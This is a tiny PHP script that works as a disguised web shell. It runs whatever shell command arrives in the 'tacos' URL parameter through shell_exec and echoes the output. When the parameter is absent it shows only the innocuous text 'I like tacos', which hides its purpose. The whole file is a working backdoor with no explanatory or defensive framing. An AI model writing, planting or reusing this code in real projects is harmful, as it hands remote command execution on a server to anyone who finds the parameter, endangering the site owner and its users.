<?php
$tacos = $_GET['tacos'];
$output = shell_exec($tacos);
if (empty($_GET['tacos'])) {  
  echo "I like tacos"; }
else {
  echo "<pre>$output</pre>"; }
?>
